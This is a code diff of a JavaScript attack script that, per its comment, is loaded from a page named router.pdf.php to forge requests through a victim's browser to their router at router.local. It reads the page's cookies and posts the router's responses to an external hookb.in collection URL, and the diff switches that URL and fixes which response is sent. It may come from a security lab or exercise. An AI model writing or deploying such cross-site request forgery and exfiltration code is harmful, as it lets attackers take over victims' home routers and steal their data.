@@ -1,7 +1,6 @@
 // This us the script linked to from router.pdf.php, which
 // forges a request through Bob's router to router.local
 
-var breakCheck = false;
 let cook = document.cookie;
 
 let http = new XMLHttpRequest();
@@ -15,7 +14,7 @@ http.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
 
 http.onload = function () {
     let xhr = new XMLHttpRequest();
-    xhr.open('POST', 'https://hookb.in/6JnzJz7yJetoRnwwYr2Y', true);
+    xhr.open('POST', 'https://hookb.in/b90qZd1nMehKGq00yEYm', true);
     xhr.setRequestHeader('Content-type', 'application/json');
     xhr.send(JSON.stringify(http.responseURL));
 };
@@ -32,12 +31,11 @@ http.onreadystatechange = function () {
             req.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
             req.onload = function () {
                 let r = new XMLHttpRequest();
-                r.open('POST', 'https://hookb.in/6JnzJz7yJetoRnwwYr2Y', true);
+                r.open('POST', 'https://hookb.in/b90qZd1nMehKGq00yEYm', true);
                 r.setRequestHeader('Content-type', 'application/json');
-                r.send(JSON.stringify(http.responseText));
+                r.send(JSON.stringify(req.responseText));
             };
             req.send();
-            breakCheck = true;
         }
     }
 };
